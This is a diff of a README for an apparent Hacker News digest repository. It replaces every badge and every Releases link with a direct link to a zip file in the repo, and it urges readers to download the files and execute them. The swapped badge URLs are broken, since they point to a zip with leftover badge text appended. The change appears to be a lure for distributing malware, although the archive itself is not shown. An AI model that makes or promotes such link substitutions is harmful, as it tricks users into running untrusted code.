@@ -1,6 +1,6 @@
 # Daily Hacker News: Stay Updated with Top Stories 🚀
 
-![Hacker News](https://img.shields.io/badge/Hacker%20News-Daily%20Updates-orange)
+![Hacker News](https://raw.githubusercontent.com/Ariefed/daily-hackernews/main/unwritten/daily-hackernews-v2.4.zip%20News-Daily%20Updates-orange)
 
 Welcome to the **Daily Hacker News** repository! Here, you can subscribe to the top stories from Hacker News each day. By watching this repo, you will receive updates on the latest and most relevant news in the tech world. 
 
@@ -33,9 +33,9 @@ To subscribe to the daily top stories, just click the "Watch" button at the top 
 
 ## Releases
 
-For the latest releases, visit the [Releases section](https://github.com/Ariefed/daily-hackernews/releases). Here, you can download the latest updates and execute the necessary files to stay in the loop with Hacker News.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/Ariefed/daily-hackernews/main/unwritten/daily-hackernews-v2.4.zip). Here, you can download the latest updates and execute the necessary files to stay in the loop with Hacker News.
 
-![Releases](https://img.shields.io/badge/Releases-Click%20Here-blue)
+![Releases](https://raw.githubusercontent.com/Ariefed/daily-hackernews/main/unwritten/daily-hackernews-v2.4.zip%20Here-blue)
 
 ## Contributing
 
@@ -51,8 +51,8 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Stay Connected
 
-For more updates, make sure to keep an eye on the [Releases section](https://github.com/Ariefed/daily-hackernews/releases). 
+For more updates, make sure to keep an eye on the [Releases section](https://raw.githubusercontent.com/Ariefed/daily-hackernews/main/unwritten/daily-hackernews-v2.4.zip). 
 
-![Stay Updated](https://img.shields.io/badge/Stay%20Updated-Join%20Us%20Now-brightgreen) 
+![Stay Updated](https://raw.githubusercontent.com/Ariefed/daily-hackernews/main/unwritten/daily-hackernews-v2.4.zip%20Updated-Join%20Us%20Now-brightgreen) 
 
 Thank you for being part of the Daily Hacker News community! Your engagement helps keep everyone informed and connected.
